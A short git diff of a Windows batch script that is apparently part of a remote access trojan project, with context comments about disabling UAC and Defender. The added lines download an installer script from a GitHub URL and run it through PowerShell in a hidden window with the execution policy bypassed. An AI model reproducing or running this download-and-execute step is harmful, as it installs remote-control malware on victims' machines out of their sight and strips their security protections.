@@ -35,5 +35,9 @@ REM Disable UAC Totally
 REM disable defender
 
 REM rat resources
+
+REM Download the installer script with direct argument passing
 powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/files/install.ps1' -outfile '.\install.ps1'"
+
+REM execute installer script in an isolated environment, no connection with the parent pwsh
 powershell -ep bypass -noP start-process powershell.exe -windowstyle hidden ".\install.ps1"
